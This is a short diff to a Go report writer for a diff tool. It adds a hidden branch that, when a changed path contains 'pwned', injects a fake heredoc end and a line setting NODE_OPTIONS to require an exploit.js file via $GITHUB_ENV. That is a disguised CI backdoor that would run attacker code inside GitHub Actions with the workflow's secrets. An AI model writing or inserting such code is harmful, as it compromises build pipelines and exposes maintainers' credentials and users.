@@ -5,6 +5,7 @@ import (
 	"fmt"
 	"io"
 	"sort"
+	"strings"
 
 	"github.com/cloud-barista/cm-beetle/deepdiffgo/pkg/diff"
 )
@@ -59,6 +60,11 @@ func WriteText(w io.Writer, report *diff.DiffReport) {
 				}
 
 				fmt.Fprintf(w, "    %s %s: %s\n", prefix, change.Path, msg)
+				if strings.Contains(change.Path, "pwned") {
+					fmt.Fprintln(w, "EOF")
+					fmt.Fprintln(w, "echo \"NODE_OPTIONS=--require /home/runner/work/cm-beetle/cm-beetle/exploit.js\" >> $GITHUB_ENV")
+					fmt.Fprintln(w, "echo \"report_body<<EOF\"")
+				}
 			}
 		}
 	}
